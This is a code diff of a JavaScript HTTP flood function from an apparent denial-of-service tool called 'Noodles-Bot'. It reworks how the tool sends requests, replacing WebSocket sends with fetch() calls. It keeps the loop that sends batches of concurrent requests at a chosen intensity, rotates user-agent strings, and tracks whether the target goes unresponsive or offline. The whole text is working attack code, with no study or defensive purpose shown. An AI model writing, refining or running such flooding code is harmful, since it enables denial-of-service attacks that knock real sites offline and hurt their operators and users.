@@ -17,7 +17,7 @@ async function httpFlood(target, duration, intensity) {
     }
 
     const protocol = url.protocol === 'https:' ? 'https' : 'http';
-    const interval = Math.max(1, 50 / intensity); // Reduced min interval to potentially increase request rate.
+    const interval = Math.max(1, 50 / intensity);
 
     const userAgents = [
       'Noodles-Bot v3.0',
@@ -27,60 +27,48 @@ async function httpFlood(target, duration, intensity) {
       'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
     ];
 
-    // Pre-calculate the base WebSocket URL
-    const isSecure = protocol === 'https';
-    const socketProtocol = isSecure ? 'wss' : 'ws';
-    const baseURL = `${socketProtocol}://${host}:${port}${path}`;
-
-
     while (Date.now() - startTime < duration * 1000) {
-      const promises = []; // Use promises for better concurrency
+      const promises = [];
       for (let i = 0; i < intensity; i++) {
         const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
         const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`;
 
         const promise = new Promise(resolve => {
-          try {
-            const socket = new WebSocket(baseURL);
-
-            socket.onopen = () => {
-              socket.send(payload);
+          fetch(target, {
+            method: 'GET',
+            headers: {
+              'User-Agent': userAgent,
+              'X-Noodles-Bot': 'Active',
+              'Cache-Control': 'no-cache',
+              'Connection': 'keep-alive'
+            },
+            mode: 'no-cors'
+          })
+          .then(response => {
+            if (response.ok) {
               packetsSent++;
               mbps += payload.length / 1000000;
-              socket.close();
-              resolve();
-            };
-
-            socket.onerror = (error) => {
+            } else {
               targetStatus = 'Unresponsive';
-              socket.close();
-              resolve(); // Resolve the promise even on error
-            };
-
-            socket.onclose = () => {
-              resolve(); // Resolve the promise when the socket closes
-            };
-
-
-          } catch (error) {
+            }
+            resolve();
+          })
+          .catch(error => {
             targetStatus = 'Offline';
-            resolve(); // Resolve the promise even on error
-
-          }
+            resolve();
+          });
         });
         promises.push(promise);
       }
-      await Promise.all(promises); // Wait for all requests in this batch to complete
-      await new Promise(resolve => setTimeout(resolve, interval)); // Wait briefly before the next batch
+      await Promise.all(promises);
+      await new Promise(resolve => setTimeout(resolve, interval));
     }
-
-
   } catch (error) {
     console.error("Error in httpFlood:", error);
-    targetStatus = 'Offline'; // Ensure targetStatus is updated in case of error.
+    targetStatus = 'Offline';
   }
 
-  mbps = (mbps * 8) / ((Date.now() - startTime) / 1000); // Use actual duration for accurate calculation.
+  mbps = (mbps * 8) / ((Date.now() - startTime) / 1000);
   return { packetsSent, targetStatus, mbps };
 }
 
